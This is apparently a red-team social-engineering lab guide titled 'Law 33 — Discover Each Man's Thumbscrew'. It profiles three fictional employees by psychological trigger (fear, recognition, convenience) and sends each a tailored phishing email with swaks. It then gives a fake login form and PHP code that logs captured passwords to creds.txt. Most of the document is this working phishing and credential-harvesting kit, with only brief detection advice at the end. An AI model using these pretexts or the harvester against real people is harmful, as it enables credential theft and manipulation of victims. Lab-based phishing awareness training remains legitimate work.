## **Law 33 — Discover Each Man’s Thumbscrew**

Interpretation (offensive context):  
Every target has a **dominant trigger** (fear, ambition, convenience, recognition). Identify it, then design the pretext to **apply pressure exactly at that point**. Generic hooks underperform; **personalized leverage converts**.

---

# 🎯 Attack Scenario — _Personalized Trigger Exploit (Per-User Hook → Credential Capture)_

You profile multiple users and craft **distinct pretexts** aligned to each person’s primary motivator.

**Targets:**

- _Aarav Mehta_ — Finance Executive → **Fear (audit/compliance)**
    
- _Nina Sokolova_ — HR Intern → **Recognition (inclusion/visibility)**
    
- _Rohan Kulkarni_ — Ops Engineer → **Convenience (time-saving/quick fix)**
    

**Attacker Persona:**

> _Elena Smirnova_, 20 y/o Internal Ops Intern

---

# 🔴 Red Team Objective

- Maximize:
    
    - **conversion rate per target**
        
- Use:
    
    - **different psychological levers per profile**
        
- Avoid:
    
    - one-size messaging
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker)** — 3GB
    
- **Ubuntu Victim(s)** — 2GB each
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Profile Extraction (Thumbscrew Identification)

Simulated dataset:

```bash
cat employees.csv
```

```text
Name, Role, Trigger
Aarav Mehta, Finance Exec, Fear (audit)
Nina Sokolova, HR Intern, Recognition
Rohan Kulkarni, Ops Engineer, Convenience
```

👉 Map each user → dominant trigger

---

## Phase 2 — Tailored Pretexts (Per-User)

### 🎯 Target A — Fear (Audit/Compliance)

```bash
swaks --to aarav@corp.local \
--from elena.s@corp.local \
--server 192.168.56.101 \
--data "Subject: Audit discrepancy flagged

Hi Aarav,

A discrepancy was flagged in recent finance access logs. Please verify your access immediately:

http://192.168.56.101:8080"
```

👉 Trigger:

- risk avoidance
    
- urgency tied to audit
    

---

### 🎯 Target B — Recognition (Inclusion)

```bash
swaks --to nina@corp.local \
--from elena.s@corp.local \
--server 192.168.56.101 \
--data "Subject: Shortlist inclusion

Hi Nina,

You’ve been included in a shortlist for internal recognition. Please confirm your details:

http://192.168.56.101:8080"
```

👉 Trigger:

- status
    
- positive reinforcement
    

---

### 🎯 Target C — Convenience (Efficiency)

```bash
swaks --to rohan@corp.local \
--from elena.s@corp.local \
--server 192.168.56.101 \
--data "Subject: Quick access fix

Hi,

We’ve simplified access—use this quick link to avoid repeated logins:

http://192.168.56.101:8080"
```

👉 Trigger:

- time-saving
    
- reduced effort
    

---

## Phase 3 — Payload (Shared Backend)

```bash
mkdir thumbscrew && cd thumbscrew
```

```html
<form action="cap.php" method="POST">
  <input name="user" placeholder="Email">
  <input type="password" name="pass" placeholder="Password">
  <button>Continue</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
?>
```

---

## Phase 4 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 5 — Execution

- Aarav → responds to **fear**
    
- Nina → responds to **recognition**
    
- Rohan → responds to **convenience**
    

👉 Same infrastructure, **different hooks → higher success**

---

# 🛠️ Tooling + Commands

### Profiling

```bash
cat employees.csv
grep -i "finance\|hr\|ops" employees.csv
```

### Delivery

```bash
swaks --to target@corp.local --from elena.s@corp.local
```

### Hosting

```bash
php -S 0.0.0.0:8080
```

### Capture

```php
file_put_contents("creds.txt", ...)
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Elicitation + profiling** → identify motivators
    
- **Pretext customization** → align with trigger
    
- **Cognitive bias targeting** (fear, reward, ease)
    

Key principle:

> The right trigger on the right person removes resistance

---

# 🛡️ Detection & Defensive Insight

Indicators:

- **role/person-specific lures** (audit for finance, rewards for HR, shortcuts for ops)
    
- unusual messages that align _too perfectly_ with a user’s role
    

Mitigation:

- train:
    
    - recognize **role-tailored phishing**
        
- enforce:
    
    - verification for:
        
        - audit notices
            
        - reward/recognition links
            
        - “quick fix” login links
            
- monitoring:
    
    - spikes in clicks tied to role-themed emails
        

---

# 📄 Report Artifact

### Title:

> Target-Specific Social Engineering via Personalized Psychological Triggers

### Include:

- user profiles + mapped triggers
    
- three tailored email samples
    
- shared payload design
    
- credential capture (lab)
    
- analysis:
    
    - comparative effectiveness per trigger
        
- impact:
    
    - higher conversion via personalization
        

---

# ⚠️ Operator Insight

Generic attacks rely on luck.  
Personalized attacks rely on **understanding**.

You are not exploiting “users”  
You are exploiting **individual motivations**.

---

